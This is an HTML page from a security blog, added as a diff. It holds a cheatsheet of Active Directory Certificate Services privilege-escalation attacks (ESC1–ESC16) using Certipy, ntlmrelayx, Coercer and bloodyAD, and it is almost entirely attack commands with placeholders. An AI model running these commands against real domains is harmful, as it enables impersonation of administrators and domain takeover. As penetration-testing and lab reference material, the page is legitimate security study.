@@ -1,0 +1,276 @@
+<!doctype html>
+<html lang="en">
+<head>
+
+
+<meta charset="utf-8"><script>(function(){try{var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],L=location,p=L.pathname;var q=new URLSearchParams(L.search),want=q.get("theme"),picked=want&&T[want]!==undefined;if(picked){localStorage.setItem("blog-theme",want);q.delete("theme")}else{want=localStorage.getItem("blog-theme")}var s=q.toString();s=s?"?"+s:"";var lost=p.indexOf(root)!==0;for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)lost=true}if(want&&want!==here&&T[want]!==undefined&&!lost){L.replace(T[want]+p.slice(root.length)+s+L.hash);return}if(picked){history.replaceState(null,"",p+s+L.hash);var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st)}}catch(e){}})()</script><style>.tsw{position:relative}.tsw summary{list-style:none;cursor:pointer;user-select:none}.tsw summary::-webkit-details-marker{display:none}.tsw-menu{position:absolute;right:0;top:calc(100% + .4rem);z-index:50;display:grid;min-width:9.5rem;padding:.3rem;border:1px solid var(--line);border-radius:8px;background:var(--bg);box-shadow:0 6px 24px rgba(0,0,0,.18)}.tsw-menu a{display:block;padding:.35rem .6rem;border-radius:5px;color:var(--fg);text-decoration:none;white-space:nowrap;box-shadow:none}.tsw-menu a:hover{background:var(--surface)}.tsw-menu a[aria-current]{color:var(--accent)}.tsw-menu a[aria-current]::after{content:" ✓"}@media print{.tsw{display:none}}.nav .tsw summary{color:var(--muted)}.nav .tsw summary:hover,.nav .tsw[open] summary{color:var(--accent)}.nav .tsw-menu a{color:var(--fg)}@media (max-width:40rem){.site-header{position:relative}.nav .tsw{position:static}.nav .tsw-menu{top:100%}}</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ADCS Attacks with Certipy · serioton</title>
+
+<meta name="description" content="ADCS Attacks with Certipy cheatsheet">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ADCS Attacks with Certipy">
+<meta property="og:url" content="https://seriotonctf.github.io/claude/ADCS-Attacks-with-Certipy/index.html">
+<meta property="og:site_name" content="serioton">
+<meta property="og:description" content="ADCS Attacks with Certipy cheatsheet">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://seriotonctf.github.io/img/thumbnails/adcs-attacks-with-certipy.png">
+<meta property="article:published_time" content="2024-06-26T15:42:13.000Z">
+<meta property="article:modified_time" content="2026-06-23T23:17:21.000Z">
+<meta property="article:author" content="serioton">
+<meta property="article:tag" content="active directory">
+<meta property="article:tag" content="adcs">
+<meta property="article:tag" content="certipy">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://seriotonctf.github.io/img/thumbnails/adcs-attacks-with-certipy.png">
+<link rel="canonical" href="https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/">
+<meta name="theme-color" content="#faf9f5" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#1f1e1d" media="(prefers-color-scheme: dark)">
+
+<link rel="icon" href="/claude/img/favicon.png">
+
+
+<link rel="alternate" type="application/atom+xml" title="serioton" href="/claude/atom.xml">
+
+<link rel="preload" as="font" type="font/woff2" href="/claude/fonts/iosevka-latin-400-normal.woff2" crossorigin>
+<link rel="stylesheet" href="/claude/css/claude.css">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||t==='light')document.documentElement.dataset.theme=t}catch(e){}</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<header class="site-header wrap">
+  <a class="brand" href="/claude/"><span class="spark" aria-hidden="true">✻</span> serioton</a>
+  <nav class="nav" aria-label="main">
+    
+    <a href="/claude/archives/">/archives</a>
+    
+    <a href="/claude/categories/">/categories</a>
+    
+    <a href="/claude/tags/">/tags</a>
+    
+    <a href="/claude/about/">/about</a>
+    
+    <details class="tsw"><summary title="switch the blog theme">/skin</summary><div class="tsw-menu"><a data-switch="butterfly" href="/?theme=butterfly">Butterfly</a><a data-switch="claude" href="/claude/?theme=claude" aria-current="true">Claude Code</a><a data-switch="loaf" href="/loaf/?theme=loaf">Loaf</a></div></details>
+    <button type="button" data-theme-toggle title="switch between light and dark">/theme</button>
+  </nav>
+</header>
+
+<main id="main" class="wrap">
+
+
+
+
+<article class="post" data-post="ADCS Attacks with Certipy">
+  <p class="you"><span aria-hidden="true">&gt;</span> cat posts/ADCS-Attacks-with-Certipy.md</p>
+
+  <header class="tool post-head">
+    <p class="call"><b>Read</b>(posts/ADCS-Attacks-with-Certipy.md)</p>
+    <p class="result">Read 285 lines</p>
+  </header>
+
+  <div class="say">
+    <h1>ADCS Attacks with Certipy</h1>
+    <p class="lede">ADCS Attacks with Certipy cheatsheet</p>
+    <div class="meta">
+      <time datetime="2024-06-26T15:42:13.000Z">2024-06-26</time>
+      <a href="/claude/categories/cheatsheet/">cheatsheet</a>
+      
+      <a href="/claude/tags/active-directory/" rel="tag">#active directory</a><a href="/claude/tags/adcs/" rel="tag">#adcs</a><a href="/claude/tags/certipy/" rel="tag">#certipy</a>
+    </div>
+  </div>
+
+  
+
+  <div class="post-body">
+    
+    <nav class="todos" aria-label="table of contents">
+      <details>
+        <summary><b>Update Todos</b></summary>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Installation"><span class="toc-text">Installation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC1"><span class="toc-text">ESC1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC3"><span class="toc-text">ESC3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC4"><span class="toc-text">ESC4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Certipy-4-8-2"><span class="toc-text">Certipy 4.8.2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Certipy-5-0-2"><span class="toc-text">Certipy 5.0.2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC7"><span class="toc-text">ESC7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC8"><span class="toc-text">ESC8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC9"><span class="toc-text">ESC9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC10"><span class="toc-text">ESC10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-1"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Case-2"><span class="toc-text">Case 2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC13"><span class="toc-text">ESC13</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC14"><span class="toc-text">ESC14</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scenario-B"><span class="toc-text">Scenario B</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC15"><span class="toc-text">ESC15</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scenario-A"><span class="toc-text">Scenario A</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scenario-B-1"><span class="toc-text">Scenario B</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC16"><span class="toc-text">ESC16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol>
+      </details>
+    </nav>
+    
+    
+    <label class="section-filter" hidden>
+      <span aria-hidden="true">grep</span>
+      <input type="search" placeholder="filter sections…" autocomplete="off" spellcheck="false" aria-label="filter sections">
+      <em aria-live="polite"></em>
+    </label>
+    
+    <div class="prose">
+      <h1 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h1><p><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation">https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation</a></p>
+<p><strong>Using pip</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install -y python3 python3-pip</span><br><span class="line">python3 -m venv certipy-venv</span><br><span class="line">source certipy-venv/bin/activate</span><br><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure>
+<p><strong>Using pipx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pipx install -f &quot;git+https://github.com/ly4k/Certipy.git&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>Using uv</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uv tool install git+https://github.com/ly4k/Certipy --force</span><br></pre></td></tr></table></figure>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><p>Search for vulnerable certificate templates</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+<p>Find PKI Enrollment Services in Active Directory and Certificate Templates Names</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+<p>Anonymously uses RPC endpoints to hunt for ADCS CAs</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator -dc-ip ip</span><br></pre></td></tr></table></figure>
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>If you run certipy and see <code>Minimum RSA Key Length : 4096</code>, you may need to provide the <code>-key-size 4096</code> option</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -domain domain -u username -dc-ip ip</span><br></pre></td></tr></table></figure>
+<p>New update:</p>
+<blockquote>
+<p>By February 2025, if the StrongCertificateBindingEnforcement registry key is not configured, domain controllers will move to Full Enforcement mode</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16">https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16</a></p>
+<p>Fix: provide the <code>-sid</code> flag for the targeted user</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template -upn administrator -sid &lt;administrator sid&gt; -dc-ip ip </span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC3"><a href="#ESC3" class="headerlink" title="ESC3"></a>ESC3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req username -p password -ca ca -target domain -template User -on-behalf-of administrator -pfx pfx_file</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC4"><a href="#ESC4" class="headerlink" title="ESC4"></a>ESC4</h1><h3 id="Certipy-4-8-2"><a href="#Certipy-4-8-2" class="headerlink" title="Certipy 4.8.2"></a>Certipy 4.8.2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy template -u username -p password -template template -save-old -dc-ip ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip</span><br></pre></td></tr></table></figure>
+<h3 id="Certipy-5-0-2"><a href="#Certipy-5-0-2" class="headerlink" title="Certipy 5.0.2"></a>Certipy 5.0.2</h3><p>The commands for certipy version 5.0.2 are different</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy template -u username@domain -p password -template template -write-default-configuration -no-save</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -ca ca -template template -upn administrator@domain</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC7"><a href="#ESC7" class="headerlink" title="ESC7"></a>ESC7</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy ca -ca ca -add-officer username -u username@domain -p password -dc-ip ip -dns-tcp -ns ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy ca -ca ca -enable-template SubCA -u username@domain -p password -dc-ip ip -dns-tcp -ns ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -ca ca -target ip -template SubCA -upn username@domain</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy ca -ca ca -issue-request request_ID -u username@domain -p password</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -ca ca -target ip -retrieve request_ID</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx pfx_file -domain domain -u username -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC9"><a href="#ESC9" class="headerlink" title="ESC9"></a>ESC9</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -hashes :hash -account target_username</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account update -u username@domain -hashes :hash -user target_username -upn administrator</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target dc_ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account update -u username@domain -hashes :hash -user target_username -upn target_username</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -domain domain</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC10"><a href="#ESC10" class="headerlink" title="ESC10"></a>ESC10</h1><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ItemProperty -Path &#x27;HKLM:\SYSTEM\CurrentControlSet\Services\Kdc&#x27; -Name StrongCertificateBindingEnforcement</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ItemProperty -Path &#x27;HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel&#x27; -Name CertificateMappingMethods</span><br></pre></td></tr></table></figure>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Case-2"><a href="#Case-2" class="headerlink" title="Case 2"></a>Case 2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account -u username@domain -p password -dc-ip ip -target dc -upn dc$@domain -user victim update</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getTGT.py domain/victim:password -dc-ip ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=victim.ccache</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -k -dc-ip ip -target dc -ca ca -template User</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account -k -dc-ip ip -target dc -upn victim@domain -user victim update</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx dc.pfx -dc-ip ip -ldap-shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line">u:DOMAIN\DC$</span><br><span class="line"></span><br><span class="line"># set_rbcd DC$ Machine_Account$</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC13"><a href="#ESC13" class="headerlink" title="ESC13"></a>ESC13</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx file.pfx -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC14"><a href="#ESC14" class="headerlink" title="ESC14"></a>ESC14</h1><h2 id="Scenario-B"><a href="#Scenario-B" class="headerlink" title="Scenario B"></a>Scenario B</h2><p><a target="_blank" rel="noopener" href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82">https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u username -p password set object target altSecurityIdentities -v &#x27;X509:&lt;RFC822&gt;target@domain&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodyAD --host dc -d domain -u owned_user -p password set object target mail -v target@domain</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account update -u owned_user@domain -p password -user username -upn target</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -template template -dc-ip ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account update -u owned_user -p password -user username -upn username@domain -dc-ip ip</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx pfx -dc-ip ip -user target -domain domain</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC15"><a href="#ESC15" class="headerlink" title="ESC15"></a>ESC15</h1><h2 id="Scenario-A"><a href="#Scenario-A" class="headerlink" title="Scenario A"></a>Scenario A</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid &lt;administrator sid&gt; -application-policies &#x27;Client Authentication&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell</span><br></pre></td></tr></table></figure>
+<h2 id="Scenario-B-1"><a href="#Scenario-B-1" class="headerlink" title="Scenario B"></a>Scenario B</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -ca ca -template WebServer -application-policies &#x27;Certificate Request Agent&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -ca ca -template User -pfx user.pfx -on-behalf-of &#x27;DOMAIN\Administrator&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip</span><br></pre></td></tr></table></figure>
+
+<h1 id="ESC16"><a href="#ESC16" class="headerlink" title="ESC16"></a>ESC16</h1><p>We use a user that has GenericAll or GenericWrite</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account -u owned_user@domain -p password -dc-ip ip -upn administrator -user username update</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid &lt;administrator sid&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy account -u owned_user@domain -p password -dc-ip ip -upn username -user username update</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip ip -domain domain</span><br></pre></td></tr></table></figure>
+<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation</a></li>
+<li><a target="_blank" rel="noopener" href="https://harmj0y.medium.com/certified-pre-owned-a22285fc0a3f">https://harmj0y.medium.com/certified-pre-owned-a22285fc0a3f</a></li>
+<li><a target="_blank" rel="noopener" href="https://mayfly277.github.io/posts/GOADv2-pwning-part6/">https://mayfly277.github.io/posts/GOADv2-pwning-part6/</a></li>
+<li><a target="_blank" rel="noopener" href="https://mayfly277.github.io/posts/ADCS-part14/">https://mayfly277.github.io/posts/ADCS-part14/</a></li>
+<li><a target="_blank" rel="noopener" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse">https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a></li>
+<li><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration">https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration</a></li>
+<li><a target="_blank" rel="noopener" href="https://vulndev.io/2023/07/01/vl-intercept-walkthrough/">https://vulndev.io/2023/07/01/vl-intercept-walkthrough/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bulletproof.co.uk/blog/abusing-esc13-from-linux">https://www.bulletproof.co.uk/blog/abusing-esc13-from-linux</a></li>
+<li><a target="_blank" rel="noopener" href="https://logan-goins.com/2024-05-04-ADCS/">https://logan-goins.com/2024-05-04-ADCS/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">https://www.tarlogic.com/blog/ad-cs-esc7-attack/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/">https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/">https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/</a></li>
+<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9">https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9</a></li>
+<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82">https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#4a82</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <footer class="post-foot">
+    
+    <div class="tool">
+      <p class="call"><b>Search</b>(related: "ADCS-Attacks-with-Certipy.md")</p>
+      <p class="result">Found 3 posts</p>
+      <ul class="list">
+        
+        <li><time datetime="2025-10-20T14:01:50.000Z">2025-10-20</time><a href="/claude/AKTIVKATALOG-1-Hack-lu-CTF-2025/">AKTIVKATALOG 1 - Hack.lu CTF 2025</a></li>
+        
+        <li><time datetime="2025-04-07T22:25:48.000Z">2025-04-07</time><a href="/claude/Shibuya-Vulnlab/">Shibuya - Vulnlab</a></li>
+        
+        <li><time datetime="2024-03-17T17:13:40.000Z">2024-03-17</time><a href="/claude/Sendai-Vulnlab/">Sendai - Vulnlab</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <nav class="neighbors" aria-label="more posts">
+      <a class="older" href="/claude/Escape-Vulnlab/" rel="next"><small>← older</small>Escape - Vulnlab</a>
+      <a class="newer" href="/claude/Getting-started-with-Sliver-C2/" rel="prev"><small>newer →</small>Getting started with Sliver C2</a>
+    </nav>
+    
+  </footer>
+</article>
+
+</main>
+<footer class="site-footer wrap">
+  
+  <p><span class="spark" aria-hidden="true">✻</span> © 2023–2026 serioton · <a href="/claude/atom.xml">rss</a></p>
+</footer>
+
+
+<div class="bar" data-index="/claude/search.xml">
+  <div class="wrap">
+    <div class="ask">
+      <div class="panel" hidden>
+        <div class="panel-head"></div>
+        <ol class="panel-list" role="listbox" aria-label="results"></ol>
+        <p class="panel-note" aria-live="polite"></p>
+      </div>
+      <label class="input">
+        <span aria-hidden="true">&gt;</span>
+        <input type="text" placeholder='Try "kerberos" or /help' autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="search posts or type a command">
+      </label>
+    </div>
+    <div class="status">
+      <button type="button" class="mode" data-mode-cycle title="shift+tab to cycle modes"><span data-mode-label>? for shortcuts</span></button>
+      <span class="status-right">
+        <button type="button" data-run="model" title="/model"><span data-model>Mythos 5.2</span></button>
+        <button type="button" data-run="effort" title="/effort"><span data-effort>high</span><span class="ctx-word"> effort</span></button>
+        <button type="button" class="ctx" data-run="context" title="/context"><span class="meter" aria-hidden="true"><i></i></span><span data-ctx>0%</span><span class="ctx-word"> context</span></button>
+      </span>
+    </div>
+  </div>
+  <script type="application/json" class="commands">[{"name":"/home","hint":"list all posts","url":"/claude/"},{"name":"/archives","hint":"open archives","url":"/claude/archives/"},{"name":"/categories","hint":"open categories","url":"/claude/categories/"},{"name":"/tags","hint":"open tags","url":"/claude/tags/"},{"name":"/about","hint":"open about","url":"/claude/about/"},{"name":"/rss","hint":"subscribe to the feed","url":"/claude/atom.xml"},{"name":"/resume","hint":"go back to a post you were reading","run":"resume"},{"name":"/random","hint":"read a random post","run":"random"},{"name":"/context","hint":"how much of the context window this page takes","run":"context"},{"name":"/compact","hint":"hide command output in code blocks, or bring it back","run":"compact"},{"name":"/model","hint":"pick the model shown in the status line","run":"model"},{"name":"/effort","hint":"set how hard the model thinks","run":"effort"},{"name":"/permissions","hint":"sites you allowed links to open without asking","run":"permissions"},{"name":"/status","hint":"current model, mode and setup","run":"status"},{"name":"/theme","hint":"switch between light and dark","run":"theme"},{"name":"/butterfly","hint":"switch the blog to the Butterfly theme","url":"/?theme=butterfly"},{"name":"/loaf","hint":"switch the blog to the Loaf theme","url":"/loaf/?theme=loaf"},{"name":"/export","hint":"print this page or save it as a PDF","run":"export"},{"name":"/clear","hint":"reset the mode, filters and prompt","run":"clear"},{"name":"/top","hint":"scroll to the top","run":"top"},{"name":"/help","hint":"list commands and shortcuts","run":"help"}]</script><script>(function(){var s=document.currentScript.previousElementSibling,T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},root="/claude/",p=location.pathname,rel=p.indexOf(root)===0?p.slice(root.length):"";try{var c=JSON.parse(s.textContent);c.forEach(function(x){var m=/\?theme=([\w-]+)$/.exec(x.url||"");if(m&&T[m[1]]!==undefined)x.url=T[m[1]]+rel+"?theme="+m[1]});s.textContent=JSON.stringify(c)}catch(e){}})()</script>
